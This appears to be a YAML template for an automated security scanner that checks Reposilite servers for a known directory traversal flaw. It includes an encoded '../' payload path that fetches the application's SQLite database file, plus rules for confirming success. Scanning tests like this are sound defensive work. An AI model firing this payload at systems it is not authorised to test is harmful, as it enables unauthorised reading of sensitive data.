id: REPOSILITE_LFI
info:
  name: "Reposilite Directory Traversal Test"
  description: "The Reposilite Directory Traversal Test checks for vulnerabilities in the Reposilite application where attackers could manipulate file paths to access files outside the intended directory. This vulnerability occurs when user-supplied input is not properly sanitized, allowing attackers to traverse the directory structure. If exploited, it could lead to unauthorized access to sensitive files or system resources. Proper input validation and access control mechanisms are essential to prevent directory traversal attacks in Reposilite."
  details: "The Reposilite Directory Traversal Test examines how Reposilite handles file paths in requests, particularly when it serves repository data or static files. If the application fails to properly sanitize or validate user input, an attacker could use techniques like `../` sequences to traverse the file system and access files outside the designated directories. This could expose sensitive files, configuration settings, or system resources. To mitigate this risk, Reposilite should properly sanitize file paths and implement strict access control for file system access."
  impact: "The impact of a Reposilite Directory Traversal vulnerability is significant, as it could allow attackers to access sensitive files or configuration data that are meant to be restricted. Exploiting this flaw could lead to data leakage, unauthorized modifications, or system compromise. Attackers could gain access to critical system files, potentially leading to further exploitation or service disruption. Ensuring robust input validation and securing file access are crucial to preventing such attacks."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: REPOSILITE_LFI
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2021-39433
    - CVE-2023-22973


attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
compliance_standards: compliance/lfi.conf
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
wordLists:
  paths:
    - '/javadoc/releases/javadoc/1.0.0/raw/..%5c..%2f..%2f..%2f..%2f..%2freposilite.db'
execute:
  type: single
  requests:
    - req:
        - modify_url: "${paths}"
        - modify_method: GET
        - replace_body: '{}'
validate:
  response_code:
    eq: 200
  response_payload:
    length:
      gt: 0
    contains_all:
      - "reposilite"
      - "SQLite format"
  response_headers:
    for_one:
      key:
        eq: "content-type"
      value:
        eq: "application/octet-stream"
strategy:
  run_once: /
